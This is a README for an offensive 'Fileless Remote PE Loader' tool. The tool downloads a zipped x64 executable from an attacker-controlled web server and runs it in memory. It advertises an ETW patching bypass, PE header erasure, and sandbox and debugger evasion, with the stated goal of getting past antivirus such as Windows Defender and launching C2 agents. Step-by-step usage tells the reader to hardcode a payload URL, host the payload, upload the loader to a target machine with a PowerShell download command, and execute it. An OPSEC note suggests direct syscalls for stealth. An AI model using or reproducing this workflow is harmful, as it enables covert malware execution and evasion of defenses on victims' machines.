### Fileless-Remote-PE-Loader
--------------------------------------
This loader tool enables direct in-memory execution of a x64 PE file (exe embeded in a zip file) retrieved from a remote web server.
It implements several defense evasion techniques (e.g. fileless delivery + reflective PE loading, ETW bypass, sandbox checks) designed to bypass antivirus solutions such as Windows Defender.

#### FEATURES
- Fileless delivery + Reflective PE loading (Downloads, decompresses, and executes in-memory a remote x64 PE) 
- ETW bypass in user-mode (patching EtwEventWrite functions)
- PE header erasure (After mapping the PE into memory, the DOS + NT headers are zeroed out to reduce forensic visibility) 
- Memory protection hardening (Applies section-specific memory permissions i.e. first writable, then switched to execute-only)
- Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
- Compatible with many offensive security tools (x64 EXE, unmanaged code, no GUI) such as C2 agents (e.g. Sliver, Havoc), ...


#### USAGE
- STEP 1 - Modify the source code by removing all comments and 'printf' statements, etc. Then, add into the main() function the URL of your ZIP file embeding the offensive security tool that you want to execute.
```
Edit the main() function - Examples:
 - BYTE *zipData = DownloadZipToMemory("http://Your-IP-address/file.zip", &zipSize);
   or
 - BYTE *zipData = DownloadZipToMemory("https://website/file.zip", &zipSize);
```

- STEP 2 - Compile the source code (for example with Visual Studio 2022 Developer Command Prompt v17.14.14).  
           <i/>Note: the tool uses the 'miniz.c' library to perform ZIP decompression operations (https://github.com/richgel999/miniz)</i>
```
Example:
c:\path-to-project\Fileless-Remote-PE-Loader> cl /TC Fileless-Remote-PE-Loader.c miniz.c /link wininet.lib /MACHINE:X64 /OUT:Fileless-Remote-PE-Loader.exe Icon.res
```

- STEP 3 - Host on a web server the ZIP file embeding the offensive security tool (x64 PE) that you want to execute
```
Examples:
- http://XX.XX.XX.XX:8080/file.zip
- http://XX.XX.XX.XX/file.zip
- https://your.website/file.zip
```
- STEP 4 - Upload the tool 'Fileless-Remote-PE-Loader.exe' on a target Windows machine and use it to download, unzip and execute in-memory your remote compressed offensive security tool
```
1. Download the loader
c:\temp> powershell -c "wget -uri https://IP/Fileless-Remote-PE-Loader.exe - OutFile C:\temp\Fileless-Remote-PE-Loader.exe

2. Run the loader with the arguments to pass to the PE
c:\temp> Fileless-Remote-PE-Loader.exe arg1 arg2 [...]
	or
2.bis Run the loader without argument
c:\temp> Fileless-Remote-PE-Loader.exe
No argument was provided. Press 'Enter' to continue, or press 'Ctrl+C' to exit and relaunch with arguments.
```

#### OPSEC improvement (to do)
- Implement direct syscalls to improve stealth beacause the use of 'VirtualAlloc' with 'PAGE_READWRITE' then 'VirtualProtect' to executable presents a 'medium' risk of detection.
  
#### LICENSE
GNU General Public License v3.0


